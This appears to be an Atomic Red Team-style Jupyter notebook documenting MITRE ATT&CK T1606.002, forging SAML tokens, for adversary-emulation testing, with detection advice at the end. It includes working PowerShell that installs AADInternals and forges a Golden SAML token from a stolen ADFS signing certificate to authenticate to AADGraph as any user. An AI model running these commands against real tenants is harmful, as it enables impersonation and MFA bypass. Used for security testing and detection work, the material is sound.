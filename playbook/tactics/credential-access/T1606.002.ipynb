{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "68493bfc",
   "metadata": {},
   "source": "# T1606.002 - SAML Tokens\nAn adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)\n\nAn adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)"
  },
  {
   "cell_type": "markdown",
   "id": "87b41dda",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "8f085a5d",
   "metadata": {},
   "source": "### Atomic Test #1 - Golden SAML\nForge a \"Golden SAML\" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n\n**Supported Platforms:** azure-ad\n#### Dependencies:  Run with `powershell`!\n##### Description: AADInternals module must be installed.\n\n##### Check Prereq Commands:\n```powershell\nif (Get-Module AADInternals) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AADInternals -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b69bd1e5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1606.002 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6872ab78",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"aehgdqBTZV50DKQZmNJ8mg==\" -PfxFileName \".\\ADFS_signing.pfx\" -Issuer \"http://contoso.com/adfs/services/trust/\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "68878808",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1606.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "d970b982",
   "metadata": {},
   "source": "## Detection\nThis technique may be difficult to detect as SAML tokens are signed by a trusted certificate. The forging process may not be detectable since it is likely to happen outside of a defender's visibility, but subsequent usage of the forged token may be seen. Monitor for anomalous logins using SAML tokens created by a compromised or adversary generated token-signing certificate. These logins may occur on any on-premises resources as well as from any cloud environment that trusts the certificate.(Citation: Microsoft SolarWinds Customer Guidance) Search for logins to service providers using SAML SSO which do not have corresponding 4769, 1200, and 1202 events in the Domain.(Citation: Sygnia Golden SAML)\n\nConsider modifying SAML responses to include custom elements for each service provider. Monitor these custom elements in service provider access logs to detect any anomalous requests.(Citation: Sygnia Golden SAML)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}